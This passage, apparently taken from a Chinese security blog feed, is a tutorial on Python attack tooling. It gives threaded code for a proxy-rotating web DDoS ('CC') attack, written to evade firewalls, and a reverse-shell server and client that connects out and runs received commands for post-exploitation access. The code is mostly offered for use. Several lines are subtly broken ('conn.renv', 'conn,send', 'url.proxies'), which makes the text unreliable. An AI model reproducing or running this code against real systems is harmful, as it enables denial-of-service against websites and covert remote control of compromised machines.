-<h2 id="3-Web密码安全审计工具"><a href="#3-Web密码安全审计工具" class="headerlink" title="3. Web密码安全审计工具"></a>3. Web密码安全审计工具</h2><h2 id="4-ChallengeCallapsar压力测试（CC：WEB-DDOS）"><a href="#4-ChallengeCallapsar压力测试（CC：WEB-DDOS）" class="headerlink" title="4. ChallengeCallapsar压力测试（CC：WEB DDOS）"></a>4. ChallengeCallapsar压力测试（CC：WEB DDOS）</h2><ol>
-<li><p>原理：多线程模拟多合法用户，确保有大量可用的代理地址</p>
-</li>
-<li><p>操作思路：</p>
-<ol>
-<li><p>引入urllib、threading模块，将获取的代理地址以列表方式存储（代理地址可采取爬虫方式批量获取）</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from urllib import request</span><br><span class="line">import threading</span><br><span class="line">url = &quot;http://www.xxxx.com/&quot;</span><br><span class="line">proxies=[&quot;114.xxx.xxx.xx:xxxx&quot;,&quot;xxx.xxx.xxx.xxx:xxxx&quot;,&quot;xxx.xxx.xxx:xxxx&quot;]</span><br><span class="line">class cc(threading.Thread):</span><br><span class="line">def __init__(self,url,proxies):</span><br><span class="line">  super(cc,self).__init__()</span><br><span class="line">  self.url=url</span><br><span class="line">  self.proxies=proxies</span><br><span class="line">  self.start()</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>CC函数定义</p>
-<ol>
-<li>request.ProxyHandler()函数设置代理服务器</li>
-<li>build_opener()函数创建自定义Opener对象</li>
-<li>Install_opener()函数创建opener</li>
-<li>可选择使用random.choice()随机选择代理地址，可呈现不规则方式，躲避目标防火墙</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># class cc(threading,Thread):</span><br><span class="line">def run(self):</span><br><span class="line">while True:</span><br><span class="line">  try:</span><br><span class="line">      pro_random = random.choice(self.proxies)</span><br><span class="line">      pro_support = request.ProxyHandler(&#123;&quot;http&quot;:pro_random&#125;)</span><br><span class="line">      opener = request.build_opener(pro_support)</span><br><span class="line">      request.install_opener(opener)</span><br><span class="line">      request.urlopen(self.url)</span><br><span class="line">  except:</span><br><span class="line">          pass</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>执行循环</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for i in range(5000):</span><br><span class="line">cc(url.proxies)</span><br></pre></td></tr></table></figure></li>
-</ol>
-</li>
-</ol>
-<h2 id="5-后渗透（维持访问）：TCP反向连接"><a href="#5-后渗透（维持访问）：TCP反向连接" class="headerlink" title="5. 后渗透（维持访问）：TCP反向连接"></a>5. 后渗透（维持访问）：TCP反向连接</h2><ol>
-<li><p>服务端：</p>
-<ol>
-<li>导入socket模块</li>
-<li>安装并绑定套接字，允许最大连接数100，超出则拒绝</li>
-<li>通过一个while循环来接受并发送用户执行的命令</li>
-<li>将结果接收回来并打印</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import socket</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.bind((&#x27;&#x27;,1234))</span><br><span class="line">s.listen(100)</span><br><span class="line">conn,addr = s.accept()</span><br><span class="line">while 1:</span><br><span class="line"> command = input(&#x27;......&gt;&#x27;)</span><br><span class="line"> if command == &#x27;exit()&#x27;:</span><br><span class="line">     conn.send(command.encode(&#x27;gbk&#x27;))</span><br><span class="line">     break</span><br><span class="line"> else:</span><br><span class="line">     if command == &#x27;&#x27;:</span><br><span class="line">         continue</span><br><span class="line">     conn,send(command.encode(&#x27;gbk&#x27;))</span><br><span class="line">     result = conn.recv(1024)</span><br><span class="line">     print(result.decode(&#x27;gbk&#x27;,&#x27;ignore&#x27;))</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>客户端</p>
-<ol>
-<li>使用subprocess执行获得的用户命令</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import socket,subprocess as sp,sys,re</span><br><span class="line">conn = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">conn.connect((&#x27;127.0.0.1&#x27;,1234))</span><br><span class="line">while 1:</span><br><span class="line"> command = conn.renv(1024)</span><br><span class="line"> if command == &#x27;exit()&#x27;:</span><br><span class="line">     break</span><br><span class="line"> else:</span><br><span class="line">     sh = sp.Popen(command.decode(&#x27;gbk&#x27;),shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE)</span><br><span class="line">     out,err=sh.communicate()</span><br><span class="line">     conn.send(out)</span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure></li>
-</ol>
-]]></content>
-      <categories>
-        <category>网络安全</category>
-        <category>WEB渗透</category>
-        <category>LINUX</category>
-      </categories>
-      <tags>
-        <tag>渗透</tag>
-        <tag>网络空间安全</tag>
-        <tag>Linux</tag>
       </tags>
   </entry>
   <entry>
